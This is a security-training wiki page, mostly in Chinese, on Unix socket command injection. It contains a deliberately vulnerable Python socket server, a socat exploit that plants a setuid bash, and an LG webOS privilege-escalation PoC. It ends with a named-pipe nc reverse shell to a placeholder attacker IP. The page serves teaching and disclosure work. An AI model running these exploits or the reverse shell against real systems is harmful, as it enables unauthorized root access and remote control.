# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Socket binding 示例（Python）

在下面的示例中，会创建一个 **unix socket** (`/tmp/socket_test.s`)，并且所有被 **接收** 的内容都会被 `os.system` **执行**。我知道你在现实中不会遇到这种情况，但这个示例的目的是展示使用 unix sockets 的代码是什么样子，以及在最糟糕的情况下如何处理输入。
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**执行** 使用 python 运行代码: `python s.py` 并 **检查 socket 的监听情况**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**漏洞利用**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## 案例研究：root 所有的 UNIX socket 基于信号触发的提权 (LG webOS)

一些具有特权的 daemons 会暴露一个 root 所有的 UNIX socket，接受不可信的输入，并将特权操作与 thread-IDs 和 signals 绑定。如果该协议允许非特权客户端影响被定位的 native thread，你可能能够触发一个特权代码路径并提权。

Observed pattern:
- Connect to a root-owned socket (e.g., /tmp/remotelogger).
- Create a thread and obtain its native thread id (TID).
- Send the TID (packed) plus padding as a request; receive an acknowledgement.
- Deliver a specific signal to that TID to trigger the privileged behaviour.

Minimal PoC sketch:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
要将其变为 root shell，可以使用一个简单的 named-pipe + nc 模式：
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
说明:
- 这类漏洞产生于信任来自非特权客户端状态（TIDs）的值，并将这些值绑定到特权的 signal handlers 或逻辑上。
- 通过在 socket 上强制验证 credentials、校验 message formats，并将特权操作与外部提供的 thread identifiers 解耦来加固。

## 参考资料

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
